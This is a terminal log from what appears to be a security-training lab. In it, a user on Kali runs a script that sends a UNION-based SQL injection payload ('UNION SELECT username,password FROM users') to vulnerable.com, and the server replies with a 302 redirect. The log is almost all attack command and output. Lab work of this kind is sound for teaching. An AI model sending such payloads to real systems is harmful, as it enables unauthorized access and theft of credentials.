┌──(kali㉿kali)-[~/cybersecurity_academy/LAB-10/SQL]
└─$ python sql_injection.py --host vulnerable.com -u "http://vulnerable.com/search?id=1" --param id --payload "' UNION SELECT username,password FROM users-- -"

[*] Invio richiesta SQL injection...
==================================================
GET http://vulnerable.com/search?id=%2527%2BUNION%2BSELECT%2Busername%252Cpassword%2BFROM%2Busers--%2B- HTTP/1.1
Host: vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Cookie: 


==================================================
[*] Risposta dal server:
==================================================
HTTP/1.1 302 Moved Temporarily
Server: openresty/1.27.1.2
Date: Mon, 10 Nov 2025 11:09:40 GMT
Content-Type: text/html
Location: https://hoax.com
Content-Length: 151

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>openresty/1.27.1.2</center>
</body>
</html>
